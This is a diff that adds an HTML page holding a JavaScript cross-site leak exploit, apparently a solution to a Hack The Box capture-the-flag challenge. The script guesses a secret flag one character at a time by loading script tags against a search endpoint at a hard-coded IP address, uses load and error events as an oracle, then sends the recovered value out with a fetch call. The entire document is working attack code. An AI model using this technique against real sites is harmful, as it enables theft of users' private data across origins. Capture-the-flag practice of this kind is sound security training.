@@ -1,0 +1,58 @@
+<html>
+
+    <body>
+
+        <script>
+
+            async function xsleak(){
+
+                flag = "HTB{"
+
+                url = "188.166.171.51:30244"
+
+                alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789}!+$@-_%"
+
+                while (!flag.endsWith("}")) {
+
+                    for (letter of alphabet){
+
+                        let promise = await new Promise((resolve, reject) => {
+
+                            const script = document.createElement("script");
+
+                            script.src="http://"+url+"/api/entries/search?q="+flag+letter
+
+                            script.onload = () => resolve(true)
+
+                            script.onerror = () => resolve(false)
+
+                            document.body.appendChild(script);
+
+                        })
+
+                        if (promise === true){
+
+                            flag += letter
+
+                            console.log(flag)
+
+                            break
+
+                        }                   
+
+                    }
+
+                }
+
+                fetch(btoa(flag))
+
+            }
+
+            xsleak();
+
+        </script>
+
+    </body>
+
+</html>
+
